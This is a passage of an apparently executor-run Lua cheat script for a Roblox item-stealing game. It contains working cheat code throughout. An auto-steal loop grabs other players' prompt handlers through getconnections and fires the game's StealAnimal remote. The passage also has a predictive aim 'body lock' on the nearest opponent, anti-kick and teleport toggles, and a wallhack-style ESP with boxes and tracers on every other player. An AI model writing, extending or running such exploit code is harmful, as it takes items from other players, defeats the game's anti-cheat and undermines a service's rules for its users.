    if cfg.infJumpMode ~= nil then __HH.infJumpMode = cfg.infJumpMode end
    if cfg.uiLocked ~= nil then __HH.uiLocked = cfg.uiLocked end
    _G.YousefUiLocked = __HH.uiLocked
    if cfg.perButtonDragEnabled ~= nil then __HH.perButtonDragEnabled = cfg.perButtonDragEnabled end
    if cfg.batV2Enabled ~= nil then __HH.batV2Enabled = cfg.batV2Enabled end
    if cfg.batAimMode == "normal" or cfg.batAimMode == "bypass" then
        batAimMode = cfg.batAimMode
    elseif cfg.batAimMode == "v1" or cfg.batAimMode == "v2" then
        batAimMode = "normal"
    end
    if cfg.skyTheme ~= nil then __HH.currentSkyTheme = cfg.skyTheme end
    if cfg.uiScale ~= nil then uiScaleValue = cfg.uiScale end
        if cfg.espEnabled ~= nil then __HH.espEnabled = cfg.espEnabled end
    if type(cfg.headlessEnabled) == "boolean" then __HH.headlessEnabled = cfg.headlessEnabled end
    if type(cfg.korbloxEnabled) == "boolean" then __HH.korbloxEnabled = cfg.korbloxEnabled end
    if type(cfg.accessoryPack) == "string" then currentAccessoryPack = cfg.accessoryPack end
    if cfg.autoLeftEnabled ~= nil then autoLeftEnabled = cfg.autoLeftEnabled end
    if cfg.autoRightEnabled ~= nil then autoRightEnabled = cfg.autoRightEnabled end
    if cfg.safeMode ~= nil then antiKickEnabled = cfg.safeMode
    elseif cfg.antiKick ~= nil then antiKickEnabled = cfg.antiKick end
    if type(cfg.aceAnimationPack) == "string" then __HH.aceSelectedAnimationPack = cfg.aceAnimationPack end
    if cfg.bodyLockEnabled ~= nil then __HH.bodyLockEnabled = cfg.bodyLockEnabled == true end
    if cfg.bodyLockRange ~= nil then __HH.bodyLockRange = math.clamp(tonumber(cfg.bodyLockRange) or 20, 5, 200) end
    if cfg.antiFlingEnabled ~= nil then __HH.antiFlingEnabled = cfg.antiFlingEnabled == true end
    -- ===== Ambitious ports =====
    _G.PureXRayEnabled                 = cfg.xrayEnabled == true
    _G.AmbitiousBrainrotXRayEnabled     = cfg.brainrotXRayEnabled == true
    _G.AmbitiousCustomToolsEnabled      = cfg.customToolsEnabled == true
    _G.AmbitiousRainbowToolsEnabled     = cfg.rainbowToolsEnabled == true
    _G.AmbitiousTransparentToolsEnabled = cfg.transparentToolsEnabled == true
    _G.AmbitiousCustomSoundsEnabled     = cfg.customSoundsEnabled == true
    _G.AmbitiousRainbowJoystickEnabled  = cfg.rainbowJoystickEnabled == true
    if type(cfg.customToolSkins) == "table" then
        _G.AmbitiousCustomToolSkins = _G.AmbitiousCustomToolSkins or {}
        for k, v in pairs(cfg.customToolSkins) do
            if type(v) == "string" then _G.AmbitiousCustomToolSkins[k] = v end
        end
    end
    _G.PureRadiusCircleEnabled = cfg.radiusCircleEnabled == true
    if cfg.radiusCircleRadius ~= nil then
        _G.PureRadiusCircleRadius = math.clamp(tonumber(cfg.radiusCircleRadius) or 8, 0.5, 500)
    end
    if type(cfg.radiusCircleColor) == "table" then
        local savedR = math.clamp(tonumber(cfg.radiusCircleColor[1]) or 201, 0, 255)
        local savedG = math.clamp(tonumber(cfg.radiusCircleColor[2]) or 238, 0, 255)
        local savedB = math.clamp(tonumber(cfg.radiusCircleColor[3]) or 255, 0, 255)
        if savedR == 255 and savedG == 213 and savedB == 140 then
            savedR, savedG, savedB = 201, 238, 255
        end
        _G.PureRadiusCircleColor = Color3.fromRGB(savedR, savedG, savedB)
    end
    if type(cfg.avatarChanger) == "table" then
        -- Il modulo Avatar Changer nasce piu' avanti: si parcheggia qui e lo
        -- legge lui stesso quando viene costruito.
        _G._AmbitiousAvatarChangerPending = cfg.avatarChanger
        -- Il modulo puo' essere gia' stato costruito (gira prima di qui):
        -- in quel caso gli si passa lo stato adesso.
        if _G._AmbitiousAvatarChangerApplyPending then
            pcall(_G._AmbitiousAvatarChangerApplyPending)
        end
    end
    if _G.HorizonStealModes then
        if cfg.autoStealRadius ~= nil then _G.HorizonStealModes.SetRadius(cfg.autoStealRadius) end
        if cfg.autoStealMode == "V1" or cfg.autoStealMode == "V2" then _G.HorizonStealModes.SetMode(cfg.autoStealMode) end
        if cfg.autoStealEnabled ~= nil then _G.HorizonStealModes.SetEnabled(cfg.autoStealEnabled == true) end
    end
    __HH.aceSyncAnimationPackIndex()
    if type(cfg.buttonVisibility) == "table" then
        for k, v in pairs(cfg.buttonVisibility) do
            if __HH.buttonVisibility[k] ~= nil then __HH.buttonVisibility[k] = v end
        end
    end
    local function applyKey(target, saved)
        if not saved or not target then return end
        if saved.kb and Enum.KeyCode[saved.kb] then target.kb = Enum.KeyCode[saved.kb] else target.kb = nil end
        if saved.gp and Enum.KeyCode[saved.gp] then target.gp = Enum.KeyCode[saved.gp] else target.gp = nil end
    end
    applyKey(__HH.KB.DropBrainrot, cfg.dropBrainrotKey); 
    applyKey(__HH.KB.TPLock, cfg.tpLockKey)
    if cfg.frameResetKey then
        -- New Frame Reset keybind storage: preserve any rebind made in the
        -- existing Combat row.
        applyKey(__HH.KB.LaggerToggle, cfg.laggerToggleKey)
        applyKey(__HH.KB.InstaReset, cfg.frameResetKey)
    else
        -- Migrate old Pure configs (Lagger=R, Insta Reset=G) to the Frame
        -- layout (Frame Reset=R, Lagger=G) without moving the UI row.
        local oldLagger = cfg.laggerToggleKey
        if oldLagger and oldLagger.kb == "R" and not oldLagger.gp then
            __HH.KB.LaggerToggle.kb = Enum.KeyCode.G
            __HH.KB.LaggerToggle.gp = nil
        else
            applyKey(__HH.KB.LaggerToggle, oldLagger)
        end
        __HH.KB.InstaReset.kb = Enum.KeyCode.R
        __HH.KB.InstaReset.gp = nil
    end
    applyKey(__HH.KB.AutoLeft, cfg.autoLeftKey); applyKey(__HH.KB.AutoRight, cfg.autoRightKey); applyKey(__HH.KB.TPFloor, cfg.tpFloorKey)
    applyKey(__HH.KB.GuiHide, cfg.guiHideKey); applyKey(__HH.KB.SpeedToggle, cfg.speedToggleKey)
    applyKey(__HH.KB.BatV2Toggle, cfg.batV2Key)
    if cfg.selectedDevice == "PC" or cfg.selectedDevice == "MOBILE" or cfg.selectedDevice == "CONTROLLER" then
        __HH.selectedDevice = cfg.selectedDevice
    end
    -- Persist immediately so first-run always has a config file on disk,
    -- and so a freshly-loaded/pasted config is saved right away too.
    saveConfig()
end

local function applyState()
    if __HH.antiRagdollEnabled then __HH.stopAntiRagdoll(); __HH.startAntiRagdoll() end
    if setAntiRagVisual then setAntiRagVisual(__HH.antiRagdollEnabled) end
    if __HH.setInfJumpVisual then __HH.setInfJumpVisual(__HH.infJumpEnabled) end
    if __HH.infJumpEnabled and __HH.infJumpMode == "hold" then __HH.startHoldInfJump() end
    if __HH.setAutoJumpBrainrotVisual then __HH.setAutoJumpBrainrotVisual(__HH.autoJumpBrainrot) end
    if __HH.setFloatVisual then __HH.setFloatVisual(__HH.floatEnabled) end
    if __HH.FRFloat then __HH.FRFloat.setHeight(__HH.floatHeight or 6) end
    if __HH.floatEnabled and __HH.FRFloat then __HH.FRFloat.setEnabled(true) end
    if __HH.medusaCounterEnabled or __HH.medusaResetEnabled then
        setupMedusa(LP.Character)
        if setMedusaVisual then setMedusaVisual(__HH.medusaCounterEnabled) end
        if setMedusaResetVisual then setMedusaResetVisual(__HH.medusaResetEnabled) end
    end
    if __HH.batCounterEnabled then startBatCounter() end
    if __HH.setBatCounterVisual then __HH.setBatCounterVisual(__HH.batCounterEnabled) end
    if _G.PureSpinBot then
        if _G.PureSpinBot.enabled and _G.PureSpinBot.start then _G.PureSpinBot.start() end
        if _G.PureSpinBot.setVisual then _G.PureSpinBot.setVisual(_G.PureSpinBot.enabled) end
    end
    if __HH.tpLockEnabled then
        if startTPLock then startTPLock() end
        if __HH.tpLockSetVisual then __HH.tpLockSetVisual(true) end
    end
    if __HH.unwalkEnabled then __HH.startUnwalk() end
    if setUnwalkVisual then setUnwalkVisual(__HH.unwalkEnabled) end
    if __HH.aceSelectedAnimationPack ~= "OFF" then
        pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
    end
    if __HH.antiLagEnabled then enableAntiLag() end
    if setAntiLagVisual then setAntiLagVisual(__HH.antiLagEnabled) end
    if __HH.stretchRezEnabled then enableStretchRez() end
    if __HH.setStretchRezVisual then __HH.setStretchRezVisual(__HH.stretchRezEnabled) end
    if __HH.autoTPEnabled then startAutoTP() end
    if __HH.setAutoTPVisual then __HH.setAutoTPVisual(__HH.autoTPEnabled) end
    if __HH.batV2Enabled then toggleBatV2() end
    if __HH.batV2SetVisual then __HH.batV2SetVisual(__HH.batV2Enabled) end
    if _G.PureMirrorTPDown and _G.PureMirrorTPDown.enabled
    and _G.PureMirrorTPDownSetVisual then
        pcall(_G.PureMirrorTPDownSetVisual, _G.PureMirrorTPDown.enabled())
    end
    if _G.PureBatSpam and _G.PureBatSpam.enabled and _G.PureBatSpamSetVisual then
        pcall(_G.PureBatSpamSetVisual, _G.PureBatSpam.enabled())
    end
    if __HH.antiDieEnabled then __HH.startAntiDie() end
    if __HH.setAntiDieVisual then __HH.setAntiDieVisual(__HH.antiDieEnabled) end
    if __HH.autoResetOnDeath then __HH.setupDeathReset() end
    if __HH.setAutoResetOnDeathVisual then __HH.setAutoResetOnDeathVisual(__HH.autoResetOnDeath) end
    if __HH.bodyLockEnabled and not __HH.batV2Enabled and not __HH.tpLockEnabled and __HH.startBodyLock then __HH.startBodyLock() end
    if __HH.setBodyLockVisual then __HH.setBodyLockVisual(__HH.bodyLockEnabled) end
    if __HH.setAntiFlingVisual then __HH.setAntiFlingVisual(__HH.antiFlingEnabled) end
    refreshSpeedModeLabel()
    
    if __HH.currentSkyTheme and __HH.currentSkyTheme ~= "Off" then applySkyTheme(__HH.currentSkyTheme) end
    if __HH.mainFrame and __HH.uiScaleObject then __HH.uiScaleObject.Scale = uiScaleValue end
    if autoLeftEnabled then startAutoLeft() end
    if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
    if autoRightEnabled then startAutoRight() end
    if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
    if __HH.espEnabled and startPlayerESP then startPlayerESP() end
    if __HH.setESPVisual then __HH.setESPVisual(__HH.espEnabled) end
    if __HH.headlessEnabled or __HH.korbloxEnabled then
        task.spawn(function()
            task.wait(0.4)
            local char = LP.Character
            if char then
                pcall(function()
                    if __HH.headlessEnabled then applyHeadless(char, true) end
                    if __HH.korbloxEnabled then applyKorblox(char, true) end
                end)
            end
        end)
    end
    if currentAccessoryPack and currentAccessoryPack ~= "Off" then
        task.spawn(function()
            task.wait(0.5)
            local char = LP.Character
            if char and currentAccessoryPack ~= "Off" then
                pcall(function() applyAccessoryPack(currentAccessoryPack) end)
            end
        end)
    end
    if setSafeModeVisual then setSafeModeVisual(antiKickEnabled) end
end

-- ============================================
-- GALAXY AUTO STEAL (V1 / V2 only)
-- Galaxy timing/trigger behavior. Only V1 and V2 are exposed in Horizon;
-- the internal 9-stud trigger distance is not shown in the UI.
do
    local P=game:GetService("Players"); local R=game:GetService("RunService"); local me=P.LocalPlayer
    local galaxy={
        enabled=false, conn=nil, busy=false, radius=60, finishRange=9,
        version="V1", data={}, stopTime=0.96, stopPercent=0.73,
    }
    local desired=true; local suspended=false
    local VERSION_CONFIG={
        V1={stopPercent=0.73,duration=0.96/0.73},
        V2={stopPercent=0.80,duration=0.96/0.80},
    }

    local function applyGalaxyVersion(v)
        if v~="V1" and v~="V2" then v="V1" end
        local cfg=VERSION_CONFIG[v]
        galaxy.version=v
        galaxy.stopPercent=cfg.stopPercent
        galaxy.duration=cfg.duration
    end
    applyGalaxyVersion("V1")

    local function galaxyMine(plot)
        local sign=plot and plot:FindFirstChild("PlotSign")
        local y=sign and sign:FindFirstChild("YourBase")
        return y and y:IsA("BillboardGui") and y.Enabled==true
    end

    local function galaxyNearest()
        local c=me.Character
        local root=c and c:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local plots=workspace:FindFirstChild("Plots")
        if not plots then return end
        local best,bd,bn,bsp=nil,math.huge,nil,nil
        for _,plot in ipairs(plots:GetChildren()) do
            if not galaxyMine(plot) then
                local pods=plot:FindFirstChild("AnimalPodiums")
                if pods then
                    for _,pod in ipairs(pods:GetChildren()) do
                        local base=pod:FindFirstChild("Base")
                        local sp=base and base:FindFirstChild("Spawn")
                        if sp then
                            local d=(sp.Position-root.Position).Magnitude
                            if d<=galaxy.radius and d<bd then
                                for _,pr in ipairs(sp:GetDescendants()) do
                                    local ac=pr:IsA("ProximityPrompt") and (pr.ActionText or "") or ""
                                    if ac:find("Steal") then
                                        best,bd,bn,bsp=pr,d,pod.Name,sp
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        return best,bn,bsp
    end

    local function galaxyValid()
        return desired and not suspended and galaxy.enabled
    end

    local function galaxyExecute(pr,pod,sp)
        if galaxy.busy or not galaxyValid() then return end
        if not galaxy.data[pr] then
            galaxy.data[pr]={hold={},trigger={},ready=true}
            pcall(function()
                local gc=rawget(getfenv and getfenv() or _G,"getconnections") or getconnections
                if gc then
                    for _,c in ipairs(gc(pr.PromptButtonHoldBegan)) do
                        if c.Function then table.insert(galaxy.data[pr].hold,c.Function) end
                    end
                    for _,c in ipairs(gc(pr.Triggered)) do
                        if c.Function then table.insert(galaxy.data[pr].trigger,c.Function) end
                    end
                end
            end)
        end
        local data=galaxy.data[pr]
        if not data.ready then return end
        data.ready=false; galaxy.busy=true
        task.spawn(function()
            pcall(function()
                if #data.hold>0 then
                    for _,f in ipairs(data.hold) do task.spawn(f) end
                else
                    pr:InputHoldBegin()
                end

                local started=tick()
                local duration=galaxy.duration
                local promptFired=false

                -- Galaxy's fixed stop point; only V1/V2 change the percentage.
                while galaxyValid() and pr.Parent and tick()-started<galaxy.stopTime do
                    local pct=math.clamp((tick()-started)/duration,0,1)
                    if _G.StealBar then
                        _G.StealBar.SetState("STEALING")
                        _G.StealBar.SetProgress(pct,"STEALING")
                    end
                    local c=me.Character
                    local root=c and c:FindFirstChild("HumanoidRootPart")
                    if root and sp and (root.Position-sp.Position).Magnitude>galaxy.radius then return end
                    task.wait()
                end
                if not galaxyValid() or not pr.Parent then return end

                if _G.StealBar then
                    _G.StealBar.SetProgress(galaxy.stopPercent,"STEALING")
                end

                -- Internal Galaxy trigger distance; it is intentionally hidden
                -- from the Horizon UI.
                while galaxyValid() and pr.Parent do
                    local c=me.Character
                    local root=c and c:FindFirstChild("HumanoidRootPart")
                    if root and sp and (root.Position-sp.Position).Magnitude<=galaxy.finishRange then break end
                    if root and sp and (root.Position-sp.Position).Magnitude>galaxy.radius then return end
                    if _G.StealBar then _G.StealBar.SetProgress(galaxy.stopPercent,"STEALING") end
                    task.wait()
                end
                if not galaxyValid() or not pr.Parent then return end

                local fill=tick()
                local fillDuration=math.max(duration-galaxy.stopTime,.05)
                while galaxyValid() and pr.Parent do
                    local fp=math.clamp((tick()-fill)/fillDuration,0,1)
                    if _G.StealBar then
                        _G.StealBar.SetProgress(galaxy.stopPercent+fp*(1-galaxy.stopPercent),"STEALING")
                    end
                    if fp>=1 and not promptFired then
                        promptFired=true
                        for _,f in ipairs(data.trigger) do task.spawn(f) end
                        local re=game:GetService("ReplicatedStorage"):FindFirstChild("StealAnimal")
                        if re and pod then re:FireServer(pod) end
                        if pr then pcall(function() pr:Fire() end) end
                        break
                    end
                    task.wait()
                end
            end)
            pcall(function() pr:InputHoldEnd() end)
            data.ready=true; galaxy.busy=false
            if _G.StealBar then _G.StealBar.Reset() end
        end)
    end

    local function stopGalaxy()
        galaxy.enabled=false
        galaxy.busy=false
        if galaxy.conn then galaxy.conn:Disconnect();galaxy.conn=nil end
        if _G.StealBar then _G.StealBar.Reset() end
    end

    local function applyGalaxy()
        stopGalaxy()
        if not desired or suspended then return end
        galaxy.enabled=true
        galaxy.conn=R.Heartbeat:Connect(function()
            if galaxy.busy or not galaxyValid() then return end
            local p,n,sp=galaxyNearest()
            if p then galaxyExecute(p,n,sp) end
        end)
    end

    _G.HorizonStealModes={
        SetMode=function(m)
            applyGalaxyVersion(m=="V2" and "V2" or "V1")
            applyGalaxy()
            if _G.StealBar then _G.StealBar.Reset() end
        end,
        GetMode=function() return galaxy.version end,
        SetEnabled=function(on)
            desired=on==true
            applyGalaxy()
            if _G.StealBar then _G.StealBar.Reset() end
        end,
        GetEnabled=function() return desired end,
        Suspend=function() suspended=true;applyGalaxy() end,
        Resume=function() suspended=false;applyGalaxy() end,
        IsSuspended=function() return suspended end,
        SetRadius=function(v)
            galaxy.radius=math.max(1,tonumber(v) or 60)
        end,
        GetRadius=function() return galaxy.radius end,
    }
    applyGalaxy()
end

do
    local P=game:GetService("Players"); local R=game:GetService("RunService"); local me=P.LocalPlayer
    __HH.bodyLockEnabled=false; __HH.bodyLockRange=20; __HH.bodyLockConn=nil; __HH.setBodyLockVisual=nil
    local function stopBL()
        if __HH.bodyLockConn then __HH.bodyLockConn:Disconnect();__HH.bodyLockConn=nil end
        local c=me.Character;local h=c and c:FindFirstChildOfClass("Humanoid");local r=c and c:FindFirstChild("HumanoidRootPart")
        if h then h.AutoRotate=true end;if r then r.AssemblyAngularVelocity=Vector3.zero end
    end
    __HH.stopBodyLock=stopBL
    __HH.startBodyLock=function()
        stopBL(); if not __HH.bodyLockEnabled or __HH.batV2Enabled or __HH.tpLockEnabled then return end
        __HH.bodyLockConn=R.RenderStepped:Connect(function()
            if __HH.batV2Enabled or __HH.tpLockEnabled then return end
            local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");local hum=c and c:FindFirstChildOfClass("Humanoid");if not root or not hum then return end
            local target,dist=nil,math.huge
            for _,p in ipairs(P:GetPlayers()) do if p~=me and p.Character then local tr=p.Character:FindFirstChild("HumanoidRootPart");local th=p.Character:FindFirstChildOfClass("Humanoid")
                if tr and th and th.Health>0 then local d=(tr.Position-root.Position).Magnitude;if d<dist then target,dist=tr,d end end end end
            if not target or dist>__HH.bodyLockRange then hum.AutoRotate=true;return end
            hum.AutoRotate=false
            local tv=target.AssemblyLinearVelocity
            local predicted=target.Position+tv*math.clamp(tv.Magnitude/80,.08,.35)
            local head=target.Parent and target.Parent:FindFirstChild("Head")
            local targetY=head and head.Position.Y or target.Position.Y
            local correction=math.clamp((targetY-(root.Position.Y+(hum.HipHeight or 0)))*.15,-1.5,1.5)
            local flat=Vector3.new(predicted.X,root.Position.Y+correction,predicted.Z)
            if (flat-root.Position).Magnitude>.1 then
                local goal=CFrame.lookAt(root.Position,flat);local diff=root.CFrame:Inverse()*goal
                local _,ry,_=diff:ToEulerAnglesXYZ();ry=math.clamp(ry,-2.5,2.5)
                root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(Vector3.new(0,ry*42,0))
            end
        end)
    end

    __HH.antiFlingEnabled=false; __HH.setAntiFlingVisual=nil
    local fixing=false;local untilT=0
    R.Heartbeat:Connect(function()
        if not __HH.antiFlingEnabled or __HH.batV2Enabled or __HH.tpLockEnabled or __HH.dropActive then fixing=false;return end
        local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");if not root then return end
        if fixing then root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero;if os.clock()>=untilT then fixing=false end
        elseif root.AssemblyLinearVelocity.Magnitude>=140 or root.AssemblyAngularVelocity.Magnitude>=90 then fixing=true;untilT=os.clock()+.15 end
    end)

    __HH.antiVoidTPBat=false;local hist={}
    R.Heartbeat:Connect(function()
        if not __HH.antiVoidTPBat then hist={};return end
        local c=me.Character;local root=c and c:FindFirstChild("HumanoidRootPart");if not root then return end
        local now=os.clock();table.insert(hist,{t=now,p=root.Position});while #hist>0 and now-hist[1].t>2 do table.remove(hist,1) end
        local old=nil;for i=#hist,1,-1 do if hist[i].t<=now-.6 then old=hist[i].p;break end end
        if old and (root.Position-old).Magnitude>150 then root.CFrame=CFrame.new(old);root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero;hist={} end
    end)
end

-- ============================================
-- ESP (UVA DUELS port): mini avatar billboard + highlight box + tracer lines
-- ============================================
do
    local playerData = {}
    local playerSPConnections = {}
    local playerSPRenderConn = nil
    local playerSPRunning = false

    local ESP_CONFIG = {
        CircleSize = 32,
        AvatarOffset = 2.5,
        LineColor = Color3.fromRGB(172, 225, 255),
        LineThickness = 1.5,
        BoxColor = Color3.fromRGB(173, 225, 255),
        BoxThickness = 2,
        GlowColor = Color3.fromRGB(201, 238, 255),
        GlowSize = 0.65,
        GlowTransparency = 0.05,
        FontSize = 10,
        NameOffset = 2,
    }

    -- clean leftovers from previous versions / previous runs
    pcall(function()
        for _, d in ipairs(workspace:GetDescendants()) do
            if d.Name == "VoidedESP" or d.Name == "VoidedESPTag"
                or d.Name == "MiniAvatarESP" or d.Name == "RedESPBox" then
                d:Destroy()
            end
        end
        local function sweep(root)
            if not root then return end
            for _, g in ipairs(root:GetChildren()) do
                if string.sub(g.Name, 1, 11) == "HorizonESP_" or string.sub(g.Name, 1, 8) == "DiceESP_" then
                    g:Destroy()
                end
            end
        end
        sweep(game:GetService("CoreGui"))
        sweep(LP:FindFirstChildOfClass("PlayerGui"))
    end)

    local function createPlayerSPBillboard(player, char)
        if not char then return end
        local head = char:FindFirstChild("Head")
        if not head then return end

        local existing = head:FindFirstChild("MiniAvatarESP")
        if existing then existing:Destroy() end

        local billboard = Instance.new("BillboardGui")
        billboard.Name = "MiniAvatarESP"
        billboard.Size = UDim2.new(0, 80, 0, 110)
        billboard.StudsOffset = Vector3.new(0, ESP_CONFIG.AvatarOffset, 0)
        billboard.AlwaysOnTop = true
        billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        billboard.Parent = head

        local container = Instance.new("Frame", billboard)
        container.Size = UDim2.new(1, 0, 1, 0)
        container.BackgroundTransparency = 1
        container.ClipsDescendants = false

        local circleSize = ESP_CONFIG.CircleSize
        local radius = circleSize / 2

        local circleBg = Instance.new("Frame", container)
        circleBg.Size = UDim2.new(0, circleSize, 0, circleSize)
        circleBg.Position = UDim2.new(0.5, -radius, 0, 0)
        circleBg.BackgroundColor3 = Color3.fromRGB(11, 25, 39)
        circleBg.BackgroundTransparency = 0.3
        circleBg.BorderSizePixel = 0
        circleBg.ZIndex = 1

        local corner = Instance.new("UICorner", circleBg)
        corner.CornerRadius = UDim.new(1, 0)

        local stroke = Instance.new("UIStroke", circleBg)
        stroke.Color = Color3.fromRGB(172, 225, 255)
        stroke.Thickness = 1.5
        stroke.Transparency = 0.5

        local avatarImage = Instance.new("ImageLabel", circleBg)
        avatarImage.Size = UDim2.new(1, -4, 1, -4)
        avatarImage.Position = UDim2.new(0, 2, 0, 2)
        avatarImage.BackgroundTransparency = 1
        avatarImage.ZIndex = 2

        local avatarUrl = string.format(
            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
            player.UserId
        )
        avatarImage.Image = avatarUrl

        local nameLabel = Instance.new("TextLabel", container)
        nameLabel.Size = UDim2.new(1, 0, 0, 20)
        nameLabel.Position = UDim2.new(0, 0, 0, circleSize + ESP_CONFIG.NameOffset)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = player.DisplayName or player.Name
        nameLabel.TextColor3 = Color3.fromRGB(172, 225, 255)
        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        nameLabel.TextStrokeTransparency = 0.3
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextSize = ESP_CONFIG.FontSize
        nameLabel.TextScaled = false
        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
        nameLabel.ZIndex = 3

        return billboard
    end

    local function createPlayerSPBox(char)
        if not char then return end
        local existing = char:FindFirstChild("RedESPBox")
        if existing then existing:Destroy() end

        local highlight = Instance.new("Highlight")
        highlight.Name = "RedESPBox"
        highlight.Adornee = char
        highlight.FillColor = ESP_CONFIG.BoxColor
        highlight.OutlineColor = Color3.fromRGB(0,0,0)
        highlight.FillTransparency = 0.7
        highlight.OutlineTransparency = 0.1
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Parent = char
        return highlight
    end

    -- Small light-blue point that stays directly under every ESP target (non-Neon).
    local function createPlayerSPGlow(player)
        local old = workspace:FindFirstChild("HorizonESPGlow_" .. tostring(player.UserId))
        if old then old:Destroy() end

        local glow = Instance.new("Part")
        glow.Name = "HorizonESPGlow_" .. tostring(player.UserId)
        glow.Shape = Enum.PartType.Ball
        glow.Size = Vector3.new(ESP_CONFIG.GlowSize, ESP_CONFIG.GlowSize, ESP_CONFIG.GlowSize)
        glow.Anchored = true
        glow.CanCollide = false
        glow.CanTouch = false
        glow.CanQuery = false
        glow.CastShadow = false
        glow.Material = Enum.Material.SmoothPlastic
        glow.Color = ESP_CONFIG.GlowColor
        glow.Transparency = ESP_CONFIG.GlowTransparency
        glow.CFrame = CFrame.new(0, -10000, 0)
        glow.Parent = workspace

        local light = Instance.new("PointLight", glow)
        light.Name = "HorizonESPBlueLight"
        light.Color = ESP_CONFIG.GlowColor
        light.Brightness = 2.5
        light.Range = 9
        light.Shadows = false
        return glow
    end

    local function setupPlayerESP(player)
        if player == LP then return end
        if playerData[player] then return end

        local data = {
            Line = nil,
            Billboard = nil,
            Box = nil,
            Glow = nil,
            Connections = {},
        }

        local line = nil
        if Drawing and type(Drawing.new) == "function" then
            line = Drawing.new("Line")
            line.Color = ESP_CONFIG.LineColor
            line.Thickness = ESP_CONFIG.LineThickness
            line.Transparency = 0.6
            line.Visible = false
        end
        data.Line = line
        data.Glow = createPlayerSPGlow(player)

        local charAddedConn = player.CharacterAdded:Connect(function(char)
            task.wait(0.3)
            local bill = createPlayerSPBillboard(player, char)
            if bill then data.Billboard = bill end
            local box = createPlayerSPBox(char)
            if box then data.Box = box end

            char:GetPropertyChangedSignal("Parent"):Connect(function()
                if not char.Parent then
                    if data.Billboard then pcall(function() data.Billboard:Destroy() end); data.Billboard = nil end
                    if data.Box then pcall(function() data.Box:Destroy() end); data.Box = nil end
                end
            end)
        end)

        table.insert(data.Connections, charAddedConn)

        local nameChangedConn = player:GetPropertyChangedSignal("DisplayName"):Connect(function()
            if data.Billboard then
                local nameLabel = data.Billboard:FindFirstChildWhichIsA("TextLabel")
                if nameLabel then nameLabel.Text = player.DisplayName end
            end
        end)
        table.insert(data.Connections, nameChangedConn)

        if player.Character then
            task.wait(0.2)
            local bill = createPlayerSPBillboard(player, player.Character)
            if bill then data.Billboard = bill end
            local box = createPlayerSPBox(player.Character)
            if box then data.Box = box end
        end

        playerData[player] = data
    end

    local function removePlayerESP(player)
        if playerData[player] then
            if playerData[player].Line then
                pcall(function() playerData[player].Line:Remove() end)
            end
            if playerData[player].Billboard then
                pcall(function() playerData[player].Billboard:Destroy() end)
            end
            if playerData[player].Box then
                pcall(function() playerData[player].Box:Destroy() end)
            end
            if playerData[player].Glow then
                pcall(function() playerData[player].Glow:Destroy() end)
            end
            for _, conn in ipairs(playerData[player].Connections or {}) do
                pcall(function() conn:Disconnect() end)
            end
            playerData[player] = nil
        end
    end

    local function updatePlayerSPLines()
        local myChar = LP.Character
        local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")

        if not myHrp then
            for _, data in pairs(playerData) do
                if data.Line then data.Line.Visible = false end
            end
            return
        end

        local myPos, visible = workspace.CurrentCamera:WorldToViewportPoint(myHrp.Position)
        if not visible then
            for _, data in pairs(playerData) do
                if data.Line then data.Line.Visible = false end
            end
            return
        end

        for player, data in pairs(playerData) do
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hrp then
                -- Keep the light point attached under the actual character,
                -- not on the floor. It follows flight, falling and dead bodies.
                if data.Glow and data.Glow.Parent then
                    local bottomOffset = (hrp.Size.Y * 0.5) + 2.35
                    data.Glow.CFrame = CFrame.new(hrp.Position - Vector3.new(0, bottomOffset, 0))
                    data.Glow.Transparency = ESP_CONFIG.GlowTransparency
                end
                local targetPos, visible2 = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
                if data.Line then
                    if visible2 then
                        data.Line.Visible = true
                        data.Line.From = Vector2.new(myPos.X, myPos.Y)
                        data.Line.To = Vector2.new(targetPos.X, targetPos.Y)
                    else
                        data.Line.Visible = false
                    end
                end
            else
                if data.Line then data.Line.Visible = false end
                if data.Glow and data.Glow.Parent then
                    data.Glow.CFrame = CFrame.new(0, -10000, 0)
                end
            end
        end
    end

    function startPlayerESP()
        if playerSPRunning then return end
        playerSPRunning = true
        __HH.espEnabled = true

        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP then
                setupPlayerESP(player)
            end
        end

        if playerSPRenderConn then playerSPRenderConn:Disconnect() end
        playerSPRenderConn = RunService.RenderStepped:Connect(function()
            pcall(updatePlayerSPLines)
        end)

        local playerAddedConn = Players.PlayerAdded:Connect(function(p)
            if p ~= LP then setupPlayerESP(p) end
        end)
        table.insert(playerSPConnections, playerAddedConn)

        local playerRemovingConn = Players.PlayerRemoving:Connect(function(p)
            removePlayerESP(p)
        end)
        table.insert(playerSPConnections, playerRemovingConn)

        local charAddedConn = LP.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            for player, data in pairs(playerData) do
                if player.Character then
                    local bill = createPlayerSPBillboard(player, player.Character)
                    if bill then
                        if data.Billboard then pcall(function() data.Billboard:Destroy() end) end
                        data.Billboard = bill
                    end
                    local box = createPlayerSPBox(player.Character)
                    if box then
                        if data.Box then pcall(function() data.Box:Destroy() end) end
                        data.Box = box
                    end
                end
            end
        end)
        table.insert(playerSPConnections, charAddedConn)
    end

    function stopPlayerESP()
        if not playerSPRunning then return end
        playerSPRunning = false
        __HH.espEnabled = false

        if playerSPRenderConn then
            playerSPRenderConn:Disconnect()
